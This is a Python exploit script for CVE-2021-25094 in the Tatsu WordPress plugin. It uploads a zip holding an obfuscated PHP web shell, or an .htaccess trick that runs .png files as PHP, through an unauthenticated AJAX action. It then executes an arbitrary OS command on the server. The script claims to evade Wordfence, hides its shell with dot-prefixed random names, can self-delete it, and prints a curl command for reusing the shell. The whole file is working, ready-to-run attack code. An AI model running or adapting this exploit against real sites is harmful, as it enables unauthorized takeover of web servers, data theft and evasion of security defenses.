#!/usr/bin/python3
# coding: utf-8

# Tatsudo: Tatsu <= 3.3.11 pre-auth RCE exploit
# The exploit bypass Wordfence
#
# Product: Tatsu wordpress plugin <= 3.3.11
# CVE: CVE-2021-25094 / Vincent MICHEL (@darkpills)
# Editor: Tasubuilder / BrandExponents.com
# URL: https://tatsubuilder.com/


import sys
import requests
import argparse
import urllib3
import threading
import time
import base64
import queue
import io
import os
import zipfile
import string
import random
from datetime import datetime
from platform import python_version

urllib3.disable_warnings()

class HTTPCaller(): 

	def __init__(self, url, headers, proxies, cmd):		
		self.url = url
		self.headers = headers
		self.proxies = proxies
		self.cmd = cmd
		self.encodedCmd = base64.b64encode(cmd.encode("utf8"))
		self.zipname = None
		self.shellFilename = None

		if self.url[-1] == '/':
			self.url = self.url[:-1]

		if proxies:
			self.proxies = {"http"  : proxies, "https" : proxies}
		else:
			self.proxies = {}

	def generateZip(self, compressionLevel, technique, customShell, keep):
		buffer = io.BytesIO()
		
		if python_version() >= '3.7.0':
			zipFile = zipfile.ZipFile(buffer, "w", zipfile.ZIP_DEFLATED, False, compressionLevel)
		else:
			zipFile = zipfile.ZipFile(buffer, "w", zipfile.ZIP_DEFLATED, False)

		if technique == "custom" and customShell and os.path.isfile(customShell):
			with open(customShell) as f:
				shell = f.readlines()
			shell = "\n".join(shell)				
			self.shellFilename = os.path.basename(customShell)
			if self.shellFilename[0] != ".":
				self.shellFilename = "." + self.shellFilename

			zipFile.writestr(self.shellFilename, shell)

		elif technique == "php":
			# a lazy obfuscated shell, basic bypass Wordfence
			# i would change base64 encoding for something better
			shell = "<?php "
			shell += "$f = \"lmeyst\";"
			shell += "@$a= $f[4].$f[3].$f[4].$f[5].$f[2].$f[1];"
			shell += "@$words = array(base64_decode($_POST['text']));"
			shell += "$j=\"array\".\"_\".\"filter\";"
			shell += "@$filtered_words = $j($words, $a);"
			if not keep:
				shell += "@unlink(__FILE__);"
			self.shellFilename = "." + (''.join(random.choice(string.ascii_lowercase) for i in range(5))) + ".php"
			zipFile.writestr(self.shellFilename, shell)


		elif technique.startswith("htaccess"):
			
			# requires AllowOverride All in the apache config file
			shell = "AddType application/x-httpd-php .png\n"
			zipFile.writestr(".htaccess", shell)				

			shell = "<?php "
			shell += "$f = \"lmeyst\";"
			shell += "@$a= $f[4].$f[3].$f[4].$f[5].$f[2].$f[1];"
			shell += "@$words = array(base64_decode($_POST['text']));"
			shell += "$j=\"array\".\"_\".\"filter\";"
			shell += "@$filtered_words = $j($words, $a);"
			if not keep:
				shell += "@unlink('.'+'h'+'t'+'a'+'cc'+'e'+'ss');"
				shell += "@unlink(__FILE__);"
			self.shellFilename = "." + (''.join(random.choice(string.ascii_lowercase) for i in range(5))) + ".png"
			zipFile.writestr(self.shellFilename, shell)

		else:
			print("Error: unknow shell technique %s" % technique)
			sys.exit(1)

		self.zipname = ''.join(random.choice(string.ascii_lowercase) for i in range(3))			

		self.zipFile = buffer

	def getShellUrl(self):
		return "%s/wp-content/uploads/typehub/custom/%s/%s" % (self.url, self.zipname, self.shellFilename)

	def executeCmd(self):		
		return requests.post(url = self.getShellUrl(), data = {"text": self.encodedCmd}, headers = self.headers, proxies = self.proxies, verify=False)

	def upload(self):
		url = "%s/wp-admin/admin-ajax.php" % self.url
		files = {"file": ("%s.zip" % self.zipname, self.zipFile.getvalue())}
		return requests.post(url = url, data = {"action": "add_custom_font"}, files = files, headers = self.headers, proxies = self.proxies, verify=False)

def main():
	
	description =  "|=== Tatsudo: pre-auth RCE exploit for Tatsu wordpress plugin <= 3.3.8\n"
	description += "|=== CVE-2021-25094 / Vincent MICHEL (@darkpills)"

	print(description)
	print("")

	parser = argparse.ArgumentParser()
	parser.add_argument("url", help="Wordpress vulnerable URL (example: https://mywordpress.com/)")
	parser.add_argument("cmd", help="OS command to execute")
	parser.add_argument('--technique', help="Shell technique: php | htaccess | custom", default="php")
	parser.add_argument('--customShell', help="Provide a custom PHP shell file that will take a base64 cmd as $_POST['text'] input")
	parser.add_argument('--keep', help="Do not auto-destruct the uploaded PHP shell", default=False, type=bool)
	parser.add_argument('--proxy', help="Specify and use an HTTP proxy (example: http://localhost:8080)")
	parser.add_argument('--compressionLevel', help="Compression level of the zip file (0 to 9, default 9)", default=9, type=int)
	

	args = parser.parse_args()
	
	# Use web browser-like header
	headers = {
		"X-Requested-With": "XMLHttpRequest",
		"Origin": args.url,
		"Referer": args.url,
		"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36",
		"Accept": "*/*",
		"Accept-Language": "en-US,en;q=0.9"
	}

	caller = HTTPCaller(args.url, headers, args.proxy, args.cmd)
	
	print("[+] Generating a zip with shell technique '%s'" % args.technique)
	caller.generateZip(args.compressionLevel, args.technique, args.customShell, args.keep)

	print("[+] Uploading zip archive to %s/wp-admin/admin-ajax.php?action=add_custom_font" % (args.url))
	r = caller.upload()
	if (r.status_code != 200 or not r.text.startswith('{"status":"success"')):
		print("[!] Got an unexpected HTTP response: %d with content:\n%s" % (r.status_code, r.text))
		print("[!] Exploit failed!")
		sys.exit(1)

	print("[+] Upload OK")

	print("[+] Trigger shell at %s" % caller.getShellUrl())
	r = caller.executeCmd()
	if (r.status_code != 200):
		print("[!] Got an unexpected HTTP response: %d with content:\n%s" % (r.status_code, r.text))
		print("[!] Exploit failed!")
		sys.exit(1)
	
	print("[+] Exploit success!")
	print(r.text)

	if args.keep:
		print("[+] Call it with:")
		print('curl -X POST -d"text=$(echo "{0}" | base64 -w0)" {1}'.format(args.cmd, caller.getShellUrl()))
	else:
		print("[+] Shell file has been auto-deleted but parent directory will remain on the webserver")

	print("[+] Job done")

if __name__ == '__main__':
    main()